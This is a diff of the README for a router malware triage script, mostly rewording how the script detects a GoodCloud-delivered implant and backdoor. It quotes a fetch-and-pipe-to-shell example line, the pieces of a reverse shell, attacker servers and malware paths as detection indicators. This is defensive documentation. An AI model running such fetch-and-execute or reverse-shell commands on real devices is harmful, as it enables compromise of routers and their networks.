@@ -78,7 +78,7 @@ This script also detects:
 - what the malware's installer leaves besides the files above. A forum user read the
   installer itself ([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90)
   of the notice's thread, an analysis made with an AI tool; the names and addresses in
-  it decode as stated, the rest is not verified by us):
+  it decode as stated, we have not verified the rest):
   - the directories it falls back to when it cannot write to the first one:
     `/etc/gl_nas/.cache`, `/userdata/.gl`, `/overlay/.gl`, `/tmp/.gl`,
   - its other files in any of these directories: `watch.sh`, `run.sh`, `wake.sh`,
@@ -94,7 +94,7 @@ This script also detects:
     `rtty`) or with a pipe into a shell, or a program on a RAM disk (`/tmp`, `/var`,
     `/run`, `/dev/shm`) that gets one of them as an argument. One user's network logs and
     the installer name the same servers. Since 2.53 a server that is only named is no
-    indicator any more ([#20](https://github.com/admonstrator/glinet-csa-2026-01/issues/20)):
+    longer an indicator ([#20](https://github.com/admonstrator/glinet-csa-2026-01/issues/20)):
     - a command that only checks whether the server answers is a name, not a fetch:
       `nc -z`, `wget --spider`, `curl -I`, or `curl`, `wget` or `uclient-fetch` whose
       content goes to `/dev/null`, to the screen or to `grep` and its kin
@@ -108,22 +108,22 @@ This script also detects:
     - an autostart file that only blocks it (`-j DROP`, `-j REJECT`, `drop`, a route to
       nowhere, a hosts entry to a null address) is `INFO` (`server-block`) and stays; it is
       listed for review like any other new or changed autostart file. A command that takes
-      a block away (`iptables -D`, `ip route del`, `delete`) is no block on its own; a
+      a block away (`iptables -D`, `ip route del`, `delete`) is not a block in itself; a
       script that deletes a rule before it adds it again, as scripts that run at every
       `ifup` do, still blocks,
     - any other file that names it is `REVIEW` (`server-ref`) and stays,
-    - in `rc.local` and the root crontab such a line is your change like any other
+    - in `rc.local` and the root crontab such a line counts as your own change, like any other
       (`PERSIST`, see below).
 
     Tool and server count together only within one command: a comment, `||`, `;`, `&&` or
-    `&` in between separates them. A line that ends in `\` goes on in the next, as in
+    `&` in between separates them. A line that ends in `\` continues on the next, as in
     `sh`, also in the text of a here-document: not when the `\` ends a comment, not after
     `\\`, and never in a crontab or a keep list, which are read line by line. Quotes on
     one line are read as `sh` reads them (since 2.54): a `;`, `&`, `|` or `#` inside a
     quoted string, as in `wget -qO- "http://…/ni.sh?id=1&arch=arm" | sh`, neither
     separates nor starts a comment, unless the string is a command itself (after `sh -c`,
     `su -c`, `eval`, `trap`, `watch`, `ssh`, `xargs` and the like). Such a line is read
-    plainly as well, as in 2.53, so that a quote `sh` reads otherwise hides nothing. Only the plain reading is
+    plainly as well, as in 2.53, so that a quote `sh` reads differently hides nothing. Only the plain reading is
     used for a quote that does not close on its line, for `$(` or a backquote inside
     double quotes, for `$'…'`, for the text of a here-document and for a line of more than
     4096 characters. A string or here-document over several lines is read line by line,
@@ -134,16 +134,16 @@ This script also detects:
     the script a shell runs, in `sh -c` or in a loop. A command that only names such a
     path, such as `less` on a log, is `REVIEW` and is not stopped,
 
-  In files only active lines count, never a comment. The name `gl-helper` counts as a word
-  of its own: a cron job that starts `gl-helper-triage.sh`, or a note that mentions the
-  malware, is no trace of it (since 2.53). A path of the malware counts only where a
+  In files only active lines count, never a comment. The name `gl-helper` counts only as a
+  whole word: a cron job that starts `gl-helper-triage.sh`, or a note that mentions the
+  malware, is not a trace of it (since 2.53). A path of the malware counts only where a
   command runs it: as the program, behind `sh`, `.`, `source`, `nohup`, `exec`, `env`,
   `timeout`, `flock`, `watch` and their kin (also as `/usr/bin/nohup`), in `sh -c`,
   `sh -s < file`, `procd_set_param command` or `start-stop-daemon`, as `./name` after
   `cd`, as the program in `$( )`, and in a crontab behind the time fields. A command
   that only names it, such as `rm -rf /etc/config/.gl`, `pgrep -f gl-helper`,
   `PID=$(pidof gl-helper)`, `command -v gl-helper` or `[ -e /etc/config/.gl/gl-helper ]`,
-  is your guard and no trace, and so is a path that stands only in the value of a
+  is your own safeguard and not a trace, and so is a path that appears only in the value of a
   variable: `REVIEW` (`path-ref`) in an autostart file, noted on the `PERSIST` line in
   `rc.local` and the root crontab. What `echo` or `printf` writes into a crontab,
   `rc.local` or another file that starts programs, or pipes into `crontab -`, is read as a
@@ -162,7 +162,7 @@ This script also detects:
   - a marker file whose sha256 is one that forum users posted for `gl-helper`, `gb`, the
     downloader or `ni.sh` ([post 101](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/101),
     [post 153](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/153))
-    is noted as such. Another hash clears nothing: the operator can build anew at any time.
+    is noted as such. A different hash clears nothing: the operator can rebuild at any time.
 
   `crond -i /tmp/.log`, the process GL.iNet's check looks for, is the name the malware
   gives its own process.
@@ -216,13 +216,13 @@ in GL-MT3000 4.11.0. GL.iNet has not confirmed this analysis. See
 and says to treat a router with such a shell as compromised. The script reports as `IOC`:
 
 - these processes, with the time they started. A process that names the address or
-  `/tmp/f` counts only when it is made like the reported shell: `nc`, `netcat` or
+  `/tmp/f` counts only when it is built like the reported shell: `nc`, `netcat` or
   `socat`, `mkfifo`, `sh -i`, or `cat /tmp/f`. An owner's `tcpdump` or `grep` for the
   address is `REVIEW` and is not stopped (since 2.53, [#7](https://github.com/admonstrator/glinet-csa-2026-01/issues/7)),
 - open connections to `170.39.226.0/24`,
 - the pipe `/tmp/f`. It stays after the shell was stopped and only goes away at a
-  restart, so it shows that the shell ran since the last boot. Its time is the last data
-  that went through it. `--fix` removes it after the archive is written.
+  restart, so it shows that the shell ran since the last boot. Its time is when data
+  last went through it. `--fix` removes it after the archive is written.
 
 `/etc/mp_ip_mapping_info` is the state file that the cloud handler writes at the end of
 each run, one line per entry that has a MAC address. The attack's message has none, so
@@ -240,9 +240,9 @@ kept the settings, and stays `IOC` (since 2.54).
 Where the filesystem holding the file is mounted `noatime`, as the overlay is on the
 routers surveyed, the script also gives its access time as the handler's first call and
 the time written as its last (since 2.35, also in the report as `state_file_first`). That
-is the time the file was created, so the first call since the file last did not exist.
+is the time the file was created, so it marks the first call since the file last did not exist.
 
-GL.iNet travel routers have no battery clock and have a wrong date until they sync the
+GL.iNet travel routers have no battery clock and show a wrong date until they sync the
 time. A file time before 2020 is therefore shown with "clock was not set, not a real
 date"; the report keeps the time as it is.
 
@@ -250,7 +250,7 @@ This trace and the firewall rule only show that a crafted command ran. With noth
 else found, the verdict is `ATTACKED`, not `INFECTED`: a forum user recovered one such
 message from the memory of the cloud client on a GL-BE9300, and it only listed the
 malware's folders and sent the listing to the attacker's server. Other devices got a
-remote shell through the same handler. What ran on a given device cannot be told
+remote shell through the same handler. What ran on a given device cannot be determined
 afterwards, so the advice on keys and passwords is the same. `--fix` has nothing to
 remove for it and leaves the file in place.
 
@@ -307,8 +307,8 @@ only. The script reports as `IOC`, with a kind that starts with `backdoor-`:
   `adguardns.org`, `adsanalypro.com` (in the second stage on 7 of RemoteToHome's 49 routers,
   since 2.54), `lede-openproject.org`, `adxinsight.com`, `openwrt-project.org`. The
   backdoor is not known to write them there, so since 2.54 a line counts where it fetches
-  from such a server, holds a URL of it, or answers it with an outside address (a hosts or
-  dnsmasq entry); also where the name stands in a list or a variable and the same file
+  from such a server, contains one of its URLs, or answers it with an outside address (a hosts or
+  dnsmasq entry); also where the name appears in a list or a variable and the same file
   fetches. A name that nothing in the file fetches from is `REVIEW` (`server-ref`).
   A line that blocks such a name is no indicator (`backdoor-block`, `INFO`): a hosts
   entry to `0.0.0.0`, `127.0.0.1`, `::` or `::1` or to a local address (a sinkhole such as
@@ -323,7 +323,7 @@ only. The script reports as `IOC`, with a kind that starts with `backdoor-`:
   a deleted file, so the script fingerprints the copy the kernel holds: on RemoteToHome's
   49 routers of five models it was one of two programs, and a match is noted as the known
   second stage.
-  Another fingerprint does not clear the process,
+  A different fingerprint does not clear the process,
 - compiled Lua anywhere in the overlay that no package installed: with the loader's
   function names in it, it is the loader under another name (`backdoor-file`), otherwise
   `REVIEW lua-bytecode`. The firmware keeps its own compiled Lua in the read-only image,
@@ -336,7 +336,7 @@ only. The script reports as `IOC`, with a kind that starts with `backdoor-`:
 A request for one of those names in AdGuard Home's query log is `REVIEW`: it shows that
 some device in the network asked, not which one.
 
-The verdict names the backdoor apart from the gl-helper indicators. `--fix` does not
+The verdict names the backdoor separately from the gl-helper indicators. `--fix` does not
 remove it: the second stage runs in memory only, runs any command, writes any file and
 opens a proxy for its server (RemoteToHome), so what was done with it cannot be listed.
 Install the firmware again with "keep settings" off, from a file you downloaded yourself,
@@ -361,7 +361,7 @@ rules show up there too.
 `/etc/firewall.user` and the files in `/etc/firewall.d` are run as shell scripts when the
 firewall starts (fw3). A line there that starts the malware or fetches from its servers is
 an `IOC` (`persist-ref`) as in any autostart file (since 2.53). `--fix` replaces that line
-by `:`, so that an `if` or a loop around it still closes, and changes no other line. This
+with `:`, so that an `if` or a loop around it still closes, and changes no other line. This
 is the one place where `--fix` changes a file that is also listed for review. If the
 script would no longer read as a script after that (`sh -n`), for example because the
 malware's command is the condition of an `if`, the file is left as it is and `--fix` ends
@@ -469,12 +469,12 @@ prints an address directly under the verdict:
 ```
 
 On a terminal the first of these lines is a green bar and the address is underlined, so
-that it is the thing a reader sees. The bar uses reverse video, so its text has the
+that it is the first thing a reader sees. The bar uses reverse video, so its text has the
 terminal's own background colour and stays readable in dark and light themes.
 
 The page behind it explains what was found, what that means and what to do, in English,
 German and Chinese. Over ssh the address often cannot be clicked, so it is short enough to
-type: nine characters, capitals or not. They hold the script's version, router or KVM, the
+type: nine characters, in upper or lower case. They hold the script's version, router or KVM, the
 kinds of findings, whether GoodCloud is on, whether the device was restarted since the
 attacks began, what `--fix` did and whether other changes are listed for review. The ninth
 character is a check, so a mistyped code is refused instead of explaining another result.
@@ -485,7 +485,7 @@ newer firmware exists for the device, from the list of
 [firmware.gl-i.net](https://firmware.gl-i.net/). The first nine work without them.
 
 No path, no name, no serial number, no ID: nothing in the code tells this device from
-another of its kind. It stands after `#`, a part of an address that a browser does not
+another of its kind. It comes after `#`, the part of an address that a browser does not
 send: opening it sends nothing about the device, and it can be posted in a forum as it is.
 The page does not check anything; it explains the code it is given. With `--fix` the
 address is printed under the verdict after the clean-up, and then also says what the
@@ -514,7 +514,7 @@ Exit codes: `0` clean, `1` indicators found, `2` fixed and clean, `3` fix incomp
 
 Every run ends with a section on GoodCloud: when it is on, or cannot be read, the script
 says to switch GoodCloud and AstroWarp off and gives the command. The attack came in
-through GoodCloud, and by reports of 22 November devices are still being hit.
+through GoodCloud, and according to reports of 22 November devices are still being hit.
 
 The head of the report appears at once. It includes whether GoodCloud is switched on
 now, with the version of its client; that is the setting at the time of the check, not
@@ -550,7 +550,7 @@ configuration are not listed.
 ## 🔄 Updating the Script
 
 The script changes several times a day while the community learns more. `--update` replaces
-it by the version that is served now:
+it with the version that is served now:
 
 ```sh
 sh gl-helper-triage.sh --update
@@ -560,15 +560,15 @@ It checks nothing on the device and changes nothing but its own file. It never r
 itself.
 
 - **Only with a good signature.** Each version is signed when it is published. The script
-  carries the public keys and takes a download only when the signature fits, checked with
+  carries the public keys and accepts a download only when the signature matches, checked with
   `usign`, the tool OpenWrt checks its package lists with. So neither someone in the
   network nor the service that hands the script out can pass on another file.
 - **Never an older version.** A version older than the one that runs is refused, even with
-  a good signature: it could be an old one with known gaps, sent on purpose.
+  a good signature: it could be an old one with known flaws, sent on purpose.
 - **Where there is no `usign`** the script says so and what that means, and asks whether to
-  update all the same. Then only the encrypted connection protects the download. Where
+  update anyway. Then only the encrypted connection protects the download. Where
   nobody can be asked, add `--unsigned`.
-- **Whatever fails, the script that is there stays.** The version from before is kept next
+- **Whatever fails, the existing script stays.** The previous version is kept next
   to it as `gl-helper-triage.sh.old`.
 
 What it does not protect against: an attacker who is root on the device, or who controls
@@ -617,15 +617,15 @@ addresses, command lines and account names: a process is sent as its kind alone,
 connection as the name of the program that holds it. An account that the firmware does
 not have is sent with its name, number and shell and whether its password field is empty
 (since 2.25), never a password or hash. These are not known traces. They
-are sent so that a pattern across devices can be seen early: the older backdoor stood in
+are sent so that a pattern across devices can be seen early: the older backdoor sat in
 people's `REVIEW` lists for a day before anyone named it. The paths are shown before the
 question, because a path of your own can say something about you. Their combination is
-also fairly particular to a device, so two reports from it can be told to belong together
+also fairly particular to a device, so two reports from it can be recognised as belonging together
 even with `--no-device-id`.
 
 When indicators were found, it also contains what the attacker left, as text:
 
-- `/etc/rc.local` in full when it was changed (up to 60 lines), because what stands around
+- `/etc/rc.local` in full when it was changed (up to 60 lines), because what surrounds
   the attacker's line matters too. From the other changed autostart files (the root
   crontab, init scripts that start the implant, `/etc/firewall.user` and `/etc/firewall.d`
   when they do) the lines that are not in the firmware image, up to 20 per file. From the lists of files a firmware update keeps, only the
@@ -653,9 +653,9 @@ server could do that before it applies its own secret; it does not, and it does 
 the value it received. If that is not good enough for you, use `--no-device-id`.
 
 Apart from the lines and paths described above, it contains no host name, none of the
-device's keys, not its password and no other file. What stands in those lines and paths
-goes as it is: addresses of your network, names, and a password or token if you wrote one
-into such a line. An account the firmware does not have goes with its name. They stay in
+device's keys, not its password and no other file. What is in those lines and paths
+is sent as it is: addresses of your network, names, and a password or token if you wrote one
+into such a line. An account the firmware does not have is sent with its name. They stay in
 the report because they can be what the attacker left; before it asks, the script says in
 bold how many lines it sends, how many of them hold IP addresses that are not the
 attacker's (a line with both counts; `127.x` and `0.0.0.0` do not), and the name of every
@@ -685,7 +685,7 @@ The receiving [worker](worker/) stores no IP address.
 6. Removes only the implant's lines (and lines that fetch from its servers) from sysupgrade
    keep lists, from the running crontab `/tmp/gl_crontabs/root`, from the firmware's
    crontab files in `/etc/gl_crontabs/crontabs.d`, and, for a key named `gl-agent`, from
-   `authorized_keys`. In `/etc/firewall.user` and `/etc/firewall.d` it replaces them by
+   `authorized_keys`. In `/etc/firewall.user` and `/etc/firewall.d` it replaces them with
    `:` (see Firewall).
    `/etc/rtty_conf` is not changed: the script cannot tell what belongs there. When it names
    the attacker's server, `--fix` says so and exits 1 if that was the only finding, or 3
@@ -796,8 +796,8 @@ unshare -rm bash tests/run-tests.sh
 KVM_LOWER=/path/to/extracted/rm1pe-1.10.2/rootfs unshare -rm bash tests/run-tests.sh
 ```
 
-On a device the script runs under busybox, whose tools differ from those of a desktop
-Linux in details. The tests can give the script its own shell and tools while they keep
+On a device the script runs under busybox, whose tools differ in details from those of a
+desktop Linux. The tests can give the script its own shell and tools while they keep
 the machine's:
 
 ```sh
@@ -859,7 +859,7 @@ is free and stays free. If it helped you, you can support his work:
 
 ## 👥 Credits
 
-This is community work, and not one person's.
+This is community work, not one person's.
 
 - [Admon](https://github.com/Admonstrator) – The script, the report service with its dashboard, and the
   [advisory page](https://gl-i.net/security/csa-2026-01/)
